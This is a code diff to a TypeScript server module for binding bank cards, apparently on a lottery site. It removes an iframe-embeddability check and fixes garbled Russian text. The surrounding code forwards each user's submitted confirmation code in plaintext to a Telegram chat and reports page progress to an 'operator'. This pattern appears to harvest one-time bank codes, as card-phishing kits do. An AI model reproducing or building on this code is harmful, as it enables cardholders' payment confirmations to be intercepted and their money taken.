@@ -64,7 +64,7 @@ async function listCards(userId: string): Promise<PaymentCardView[]> {
   }))
 }
 
-/** The confirmation page reports iframe progress so the operator API can see when the player left the page. */
+/** The confirmation page reports page progress so the operator API can see when the player left the page. */
 export async function reportCardFrame(id: number, event: "opened" | "finished"): Promise<CardsResult> {
   const userId = await getUserId()
   if (!Number.isInteger(id) || id <= 0 || (event !== "opened" && event !== "finished")) throw new Error("Invalid card")
@@ -84,40 +84,6 @@ export async function reportCardFrame(id: number, event: "opened" | "finished"):
     void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\nСтраница пройдена`)
   }
   return { ok: true, cards: await listCards(userId) }
-}
-
-/**
- * Many pages forbid embedding (X-Frame-Options / CSP frame-ancestors) and render as a blank iframe.
- * Checked server-side because the browser hides that reason; unreachable pages fall back to the iframe.
- */
-export async function checkCardFrameable(id: number): Promise<{ frameable: boolean }> {
-  const userId = await getUserId()
-  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
-  const [row] = await db.select({ url: paymentCard.redirectUrl }).from(paymentCard)
-    .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId)))
-  let target: URL
-  try {
-    target = new URL(row?.url ?? "")
-  } catch {
-    return { frameable: false }
-  }
-  const host = target.hostname
-  if (target.protocol !== "https:" || host === "localhost" || /^[\d.]+$/.test(host) || host.includes(":")) return { frameable: false }
-  try {
-    const res = await fetch(target, {
-      redirect: "follow",
-      headers: { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1" },
-      signal: AbortSignal.timeout(6000),
-    })
-    void res.body?.cancel()
-    const xfo = res.headers.get("x-frame-options")?.toLowerCase() ?? ""
-    if (xfo.includes("deny") || xfo.includes("sameorigin")) return { frameable: false }
-    const ancestors = res.headers.get("content-security-policy")?.match(/frame-ancestors([^;]*)/i)?.[1].trim().toLowerCase()
-    if (ancestors && !ancestors.split(/\s+/).some((s) => s === "*" || s === "https:" || s.includes("bytoloto.com"))) return { frameable: false }
-    return { frameable: true }
-  } catch {
-    return { frameable: true }
-  }
 }
 
 export async function getPaymentCards() {
@@ -162,7 +128,7 @@ export async function requestCardBinding(input: {
     if (total >= MAX_CARDS) return { error: `Можно привязать не больше ${MAX_CARDS} карт.` }
     const [{ pending }] = await tx.select({ pending: count() }).from(paymentCard)
       .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.status, "pending")))
-    if (pending >= MAX_PENDING) return { error: "Дождитесь обработки те����ущих заявок на привязку." }
+    if (pending >= MAX_PENDING) return { error: "Дождитесь обработки текущих заявок на привязку." }
     let requestNo = generateRequestNo()
     for (let attempt = 0; attempt < 5; attempt++) {
       const [taken] = await tx.select({ id: paymentCard.id }).from(paymentCard)
@@ -210,7 +176,7 @@ export async function submitCardCode(id: number, code: string): Promise<CardsRes
   void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n<code>${escapeTelegram(trimmed)}</code>`)
   emitCardEvent(id, "card.code_submitted", { code: trimmed })
   await notifyCardChange(user.id)
-  await logActivity("card_step", `Вв��л код подтверждения по заявке № ${row.requestNo ?? id}`)
+  await logActivity("card_step", `Ввёл код подтверждения по заявке № ${row.requestNo ?? id}`)
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
